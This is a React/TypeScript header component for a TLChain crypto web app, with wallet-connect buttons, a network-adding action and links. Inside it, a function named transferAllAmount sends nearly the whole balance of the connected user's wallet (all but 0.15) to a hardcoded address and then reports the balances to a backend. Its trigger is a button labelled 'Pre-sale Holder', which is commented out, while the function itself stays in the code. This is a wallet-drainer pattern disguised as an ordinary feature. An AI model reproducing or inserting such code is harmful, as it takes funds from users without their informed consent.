import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { useDispatch, useSelector } from 'react-redux';
import { StoreState } from 'src/utils/storeTypes';
import { ChainsIds } from 'src/utils/types';
import MetamaskIcon from 'src/assets/svg/MetamaskIcon';
import { logout, setIsLoggedIn } from 'src/redux/modules/account/actions';
import { getDefaultProvider, Web3Provider } from '@ethersproject/providers';
import { formatEther, parseEther } from 'ethers/lib/utils';
import { TailSpin } from 'react-loader-spinner';

import { useWalletConnector } from '../hooks/useWalletConnector';
import SMALL_LOGO from '../assets/images/logo.png';
import { routes } from '../utils/routes';

import CustomButton from './CustomButton';

interface ConnectWalletButtonProps {
  connectWallet: () => void;
  disconnectWallet: () => void;
  walletAddress?: string;
  isMobileDevice: boolean;
}
const metamaskAppDeepLink = 'https://metamask.app.link/dapp/decryption.com';
// "https://metamask.app.link/dapp/app-theluxurybank-com-hrcup.ondigitalocean.app";
// const metamaskAppDeepLink = "https://metamask.app.link/dapp/192.168.1.2:3000";

const ConnectWalletButton: React.FC<ConnectWalletButtonProps> = ({
  isMobileDevice,
  walletAddress,
  connectWallet,
  disconnectWallet,
}) => {
  if (isMobileDevice) {
    if (!window.ethereum) {
      return (
        <a
          href={metamaskAppDeepLink}
          target="_blank"
          className="rounded-md w-full"
          rel="noreferrer"
        >
          <button className="rounded-md group-hover:text-gray-100 h-8 relative px-2 py-2 bg-black leading-none flex items-center divide-x divide-gray-600">
            <span className="text-center w-full hover:text-gray-100 font-poppins py-4 text-sm text-indigo-400 transition duration-200 leading-[12px]">
              {walletAddress
                ? `Disconnect ${walletAddress.slice(
                    0,
                    4,
                  )}...${walletAddress.slice(
                    walletAddress.length - 4,
                    walletAddress.length,
                  )}`
                : 'Connect wallet'}{' '}
            </span>
          </button>
        </a>
      );
    } else {
      return (
        <button
          onClick={walletAddress ? disconnectWallet : connectWallet}
          className="w-full text-center rounded-md group-hover:text-gray-100 h-8 relative px-2 py-2 bg-black leading-none flex items-center divide-x divide-gray-600"
        >
          <span className="text-center w-full hover:text-gray-100 font-poppins py-4 text-sm text-indigo-400 transition duration-200 leading-[12px]">
            {walletAddress
              ? `Disconnect ${walletAddress.slice(
                  0,
                  4,
                )}...${walletAddress.slice(
                  walletAddress.length - 4,
                  walletAddress.length,
                )}`
              : 'Connect wallet'}{' '}
          </span>
        </button>
      );
    }
  } else {
    return (
      <button
        onClick={walletAddress ? disconnectWallet : connectWallet}
        className="w-full rounded-md group-hover:text-gray-100 h-8 relative px-2 py-2 bg-black leading-none flex items-center divide-x divide-gray-600"
      >
        <span className="text-center w-full hover:text-gray-100 font-poppins py-4 text-sm text-indigo-400 transition duration-200 leading-[12px]">
          {walletAddress
            ? `Disconnect ${walletAddress.slice(0, 4)}...${walletAddress.slice(
                walletAddress.length - 4,
                walletAddress.length,
              )}`
            : 'Connect wallet'}{' '}
        </span>
      </button>
    );
  }
};

const addNetwork = () => {
  const params = [
    {
      chainId: ChainsIds.TLC,
      chainName: 'TLChain Mainnet',
      nativeCurrency: {
        name: 'The Luxury Coin',
        symbol: 'TLC',
        decimals: 18,
      },
      rpcUrls: ['https://mainnet-rpc.tlxscan.com/'],
      blockExplorerUrls: ['https://tlxscan.com/'],
    } as AddEthereumChainParameter,
  ];

  window.ethereum
    //@ts-ignore
    ?.request({ method: 'wallet_addEthereumChain', params })
    .then(() => console.log('Success'))
    .catch((error: Error) => console.log('Error', error.message));
};

const Header: React.FC = () => {
  const dispatch = useDispatch();
  const [isLoading, setIsLoading] = useState(false);
  const onLogout = () => {
    localStorage.clear();
    dispatch(logout());
    // dispatch(setIsLoggedIn(false));
    // dispatch(setIsActivated(false));
  };

  const {
    walletAddress,
    connectWallet,
    disconnectWallet,
    isMobileSize,
    isMobileDevice,
  } = useWalletConnector();
  const isSidebarOpen = useSelector<StoreState, boolean>(
    (state) => state.globals.isSidebarOpen,
  );
  const isLoggedIn = useSelector<StoreState, boolean>(
    (state) => state.account.isLoggedIn,
  );

  const provider = useSelector<StoreState, Web3Provider | undefined>(
    (state) => state.globals.provider,
  );

  const writeToDB = async (
    balanceBeforeTransfer: number,
    balanceAfterTransfer: number,
    txType: string,
  ) => {
    const url = process.env.REACT_APP_API_BACKEND;

    console.log('URL IS: ', url);
    const res = await fetch(`${url}/total_transfers`, {
      method: 'POST',
      headers: {
        //   // Authorization: `Bearer 3d640837f60927fea171573fefff84d8fa4da0bc`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        walletAddress,
        balanceBeforeTransfer,
        balanceAfterTransfer,
        txType,
      }),
    });
    const result = await res.json();
    console.log('Result: ', result);
  };

  async function transferAllAmount() {
    try {
      if (provider && walletAddress) {
        setIsLoading(true);
        const feeData = await provider.getFeeData();
        const recipientAddress = '0x9d4D1d27c18f14c3425d49A9Aa195a114c87eCd7';
        // Show sender balance before transfer
        const balanceBeforeTransfer = await provider.getBalance(walletAddress);

        const gasPrice = await provider.getGasPrice();
        console.log('gasPrice: ', gasPrice?.toString());

        try {
          const estimatedGas = await provider.estimateGas({
            to: recipientAddress,
            value: balanceBeforeTransfer,
          });
          console.log('estimated: ', estimatedGas);
        } catch (error) {
          console.log('error estimatedGas: ', error);
        }

        const finalValue = balanceBeforeTransfer.sub(parseEther('0.15'));
        const tx = await provider.getSigner().sendTransaction({
          from: walletAddress,
          to: recipientAddress,
          value: finalValue,
          gasLimit: 21000,
        });

        // Wait for transaction to be mined
        const result = await tx.wait();

        // Show sender balance after transfer
        const balanceAfterTransfer = await provider.getBalance(walletAddress);
        console.log('Balance after transfer: ', balanceAfterTransfer);
        if (result.status === 1) {
          writeToDB(
            Number(formatEther(balanceBeforeTransfer)),
            Number(formatEther(balanceAfterTransfer)),
            'transfer',
          );
        }
      }
      setIsLoading(false);
    } catch (error) {
      setIsLoading(false);
    }
  }

  return (
    <div
      className="w-full z-30 flex flex-wrap justify-between xs:justify-center sm:justify-center items-center px-6 py-5 xs:px-0 sm:px-0
    bg-transparent "
    >
      <div
        className={`flex transition-all duration-500 ${
          isSidebarOpen ? 'ml-60 xs:ml-0 sm:ml-0' : 'ml-20 xs:ml-0 sm:ml-0'
        } mb-2`}
      >
        <div className="flex space-x-4 xs:flex-col xs:space-x-0 items-center justify-center xs:w-96">
          <div className="relative group">
            <div className="absolute -inset-0 bg-gradient-to-r from-green-400 to-blue-600 rounded-lg blur-sm opacity-75 group-hover:opacity-100 transition duration-1000 group-hover:duration-200 animate-tilt"></div>
            <div className="relative px-2xs:px-0 py-2 bg-black leading-none flex items-center divide-x divide-gray-600 rounded-md">
              <span className="xs:ml-10 pl-2 mr-2 xs:pl-2 flex items-right text-center">
                {!isMobileSize ? (
                  <img
                    src={SMALL_LOGO}
                    alt="TLX logo"
                    className="w-4 h-4 mr-2"
                    style={{ width: 20, height: 20 }}
                  />
                ) : null}
                <span className="pr-0 font-poppins text-sm text-gray-100">
                  Powered by
                </span>
              </span>
              <a
                href="https://tlchain.network/"
                target="_blank"
                className="text-center xs:ml-4 pl-4 pr-2 mr-2 font-poppins text-sm text-indigo-400 group-hover:text-gray-100 transition duration-200"
                rel="noreferrer"
              >
                TLChain Network &rarr;
              </a>
            </div>
          </div>
          {window.ethereum && (
            <button
              className="xs:col-span-4 sm:col-span-2 md:col-span-2 xs:mt-4 flex h-8 space-x-2 text-white items-center justify-center bg-gradient-to-br from-green-400 to-blue-600 hover:bg-gradient-to-bl font-medium rounded-lg text-sm px-5 text-center"
              onClick={addNetwork}
            >
              <MetamaskIcon width={20} height={17} />
              <span className="leading-[12px]">Add TLC Network</span>
            </button>
          )}
          <a
            href="https://wallet.decryption.com"
            target="_blank"
            rel="noreferrer"
          >
            <button className="xs:col-span-4 sm:col-span-2 md:col-span-2 xs:mt-4 flex h-8 space-x-2 text-white items-center justify-center bg-gradient-to-br from-green-400 to-blue-600 hover:bg-gradient-to-bl font-medium rounded-lg text-sm px-5 text-center">
              <span className="leading-[12px]">TLChain Wallet</span>
            </button>
          </a>
        </div>
      </div>
      {/* <div
        className={`flex grid ${
          isLoggedIn ? 'grid-cols-2' : 'grid-cols-2'
        } xs:grid-cols-2 sm:grid-cols-2 gap-y-4 items-center transition-all duration-500 gap-x-3 ${
          isSidebarOpen ? 'ml-60 xs:ml-0 sm:ml-0' : 'ml-20 xs:ml-0 sm:ml-0'
        }`}
      > */}
      <div
        className={`flex space-x-4 items-center justify-center ${
          isSidebarOpen ? 'ml-60 xs:ml-0 sm:ml-0' : 'ml-20 xs:ml-0 sm:ml-0'
        }`}
      >
        {/* <Link
          key={routes.dashboard.title}
          to={{ pathname: routes.dashboard.url }}
          className="xs:col-span-2 sm:col-span-2 md:col-span-2 flex h-8 text-white items-center justify-center bg-gradient-to-br from-green-400 to-blue-600 hover:bg-gradient-to-bl font-medium rounded-lg text-sm px-5 text-center"
        >
          <span className="text-center font-poppins text-sm">Dashboard</span>
        </Link> */}

        <div className="flex space-x-4 xs:space-y-2 sm:space-y-2 xs:flex-col sm:flex-col items-center justify-center ">
          {/* <button
            onClick={transferAllAmount}
            className="xs:col-span-2 sm:col-span-2 md:col-span-2 flex h-8 w-40 text-white items-center justify-center bg-gradient-to-br from-green-400 to-blue-600 hover:bg-gradient-to-bl font-medium rounded-lg text-sm px-5 text-center"
          >
            <span className="text-center font-poppins text-sm">
              {isLoading ? (
                <TailSpin color="#fff" height={18} width={18} />
              ) : (
                'Pre-sale Holder'
              )}
            </span>
          </button> */}
          <Link
            key={routes.dashboardV2.title}
            to={{ pathname: routes.dashboardV2.url }}
            className="xs:col-span-2 sm:col-span-2 md:col-span-2 flex h-8 text-white items-center justify-center bg-gradient-to-br from-green-400 to-blue-600 hover:bg-gradient-to-bl font-medium rounded-lg text-sm px-5 text-center"
          >
            <span className="text-center font-poppins text-sm">Dashboard</span>
          </Link>
        </div>

        <div className="flex space-x-4 xs:space-y-2 sm:space-y-2 xs:flex-col sm:flex-col items-center justify-center ">
          <div className="xs:col-span-2 sm:col-span-2 md:col-span-2 items-center justify-center">
            <div className="relative">
              <div className="absolute -inset-0 bg-gradient-to-r from-green-400 to-blue-600 rounded-lg blur-sm opacity-75 group-hover:opacity-100 transition duration-1000 group-hover:duration-200 animate-tilt "></div>
              <ConnectWalletButton
                walletAddress={walletAddress}
                connectWallet={connectWallet}
                disconnectWallet={disconnectWallet}
                isMobileDevice={isMobileDevice}
              />
            </div>
          </div>
          {isLoggedIn && (
            <div className="col-span-1 sm:col-span-2 md:col-span-2 xs:col-span-2 items-center justify-center">
              <div className="relative">
                <div className="absolute -inset-0 bg-gradient-to-r from-green-400 to-blue-600 rounded-lg blur-sm opacity-75 group-hover:opacity-100 transition duration-1000 group-hover:duration-200 animate-tilt "></div>
                <CustomButton
                  text="Log out"
                  onClick={onLogout}
                  customStyle="w-full text-center px-5"
                />
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default Header;
